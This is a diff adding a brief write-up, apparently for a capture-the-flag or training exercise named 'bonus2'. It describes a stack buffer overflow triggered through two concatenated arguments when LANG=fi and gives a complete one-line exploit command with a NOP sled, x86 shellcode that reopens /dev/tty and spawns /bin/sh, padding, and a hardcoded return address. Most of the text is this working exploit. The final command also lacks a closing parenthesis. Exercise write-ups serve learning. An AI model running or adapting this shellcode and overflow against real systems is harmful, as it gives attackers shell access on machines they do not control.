@@ -1,0 +1,7 @@
+
+program take 2 param 
+than it check in env if LANG=fi
+then it concat 40 first char of param 1 and 32 first char of param 2
+it is enough to overflow on the ret value so we put a shellcode into env and we redicrect the function to it and then gg
+
+final command: env -i LANG=fi SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')" ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xe0\xfb\xff\xbf"'
